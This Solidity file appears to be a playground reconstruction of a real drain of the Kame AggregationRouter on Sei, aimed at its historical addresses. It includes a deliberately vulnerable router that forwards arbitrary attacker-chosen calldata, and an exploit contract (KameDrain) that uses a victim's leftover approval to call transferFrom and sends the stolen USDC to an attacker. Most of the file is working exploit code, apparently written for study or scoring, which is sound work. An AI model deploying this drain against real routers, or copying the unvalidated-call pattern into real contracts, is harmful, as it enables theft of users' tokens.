// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Fully synthetic Kame AggregationRouter drain for the EVM Playground.
//
// The real attack was on Sei (chain 1329). Sei archive RPCs have pruned the
// attack block, so anvil_state cannot capture real bytecode or balances.
// This file reimplements the EXACT confused-deputy mechanism in plain EVM:
//
//   AggregationRouter.swap() does
//     params.executor.call{value: msg.value}(params.executeParams)
//   with no allow-list / selector checks. Users granted residual ERC-20
//   approvals to the router. The attacker sets executor = USDC and
//   executeParams = transferFrom(victim, attacker, balance), so the router
//   (the approved spender) drains the victim.
//
// MiniUSDC + MiniAggregationRouter are installed via codeOverrides at the
// historical Sei addresses. Balances/allowances are seeded via setup
// storeSlot. KameDrain is the playground exploit contract (run()).

address constant USDC_ADDR = 0xe15fC38F6D8c56aF07bbCBe3BAf5708A2Bf42392;
address constant ROUTER_ADDR = 0x14bb98581Ac1F1a43fD148db7d7D793308Dc4d80;
address constant VICTIM = 0x9A9F47F38276f7F7618Aa50Ba94B49693293Ab50;
// Historical profit (~18,167.88 USDC, 6 decimals).
uint256 constant VICTIM_BALANCE = 18_167_880_000;

interface IMiniUSDC {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
}

// Plain ERC20. Storage: slot 0 = balanceOf, slot 1 = allowance nested map.
// Installed via codeOverrides (no constructor) at USDC_ADDR.
contract MiniUSDC {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint8 public constant decimals = 6;
    string public constant symbol = "USDC";
    string public constant name = "USD Coin";

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) {
            allowance[from][msg.sender] = allowed - amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    /// @dev Playground seed helper (not on real USDC). Setup calls this once
    /// to give the victim a balance and an unlimited approval to the router.
    function seed(address owner, address spender, uint256 bal, uint256 allw) external {
        balanceOf[owner] = bal;
        allowance[owner][spender] = allw;
    }
}

// Vulnerable aggregation router: unvalidated executor.call.
// Installed via codeOverrides at ROUTER_ADDR.
// Storage unused — pure forwarder. Vulnerability is the unvalidated call.
contract MiniAggregationRouter {
    struct SwapParams {
        address srcToken;
        address dstToken;
        uint256 amount;
        address payable executor;
        bytes executeParams;
        bytes extraData;
    }

    event Swapped(address srcToken, address dstToken, uint256 amount, uint256 returnAmount, bytes extraData);

    /// @notice Confused-deputy surface: executor + calldata are fully attacker-controlled.
    function swap(SwapParams calldata params) external payable returns (uint256 returnAmount) {
        // THE BUG — no allow-list, no selector check, no amount validation.
        (bool ok, bytes memory ret) = params.executor.call{value: msg.value}(params.executeParams);
        require(ok, "executor call failed");
        if (ret.length >= 32) {
            returnAmount = abi.decode(ret, (uint256));
        }
        emit Swapped(params.srcToken, params.dstToken, params.amount, returnAmount, params.extraData);
    }
}

// Playground exploit: craft malicious SwapParams and call the router.
contract KameDrain {
    address public immutable recipient;

    constructor(address recipient_) {
        recipient = recipient_;
    }

    function run() external {
        IMiniUSDC usdc = IMiniUSDC(USDC_ADDR);
        uint256 bal = usdc.balanceOf(VICTIM);

        MiniAggregationRouter.SwapParams memory params;
        // Cosmetic — no real swap is intended (mirrors historical PoC).
        params.srcToken = USDC_ADDR;
        params.dstToken = USDC_ADDR;
        params.amount = 0;
        // Point executor at the USDC token itself.
        params.executor = payable(USDC_ADDR);
        // Router will low-level-call this as msg.sender (approved spender).
        params.executeParams = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            VICTIM,
            address(this),
            bal
        );
        params.extraData = hex"01";

        MiniAggregationRouter(ROUTER_ADDR).swap(params);

        // Forward drained USDC to the attacker EOA for profit scoring.
        uint256 got = usdc.balanceOf(address(this));
        if (got > 0) {
            usdc.transfer(recipient, got);
        }
    }
}
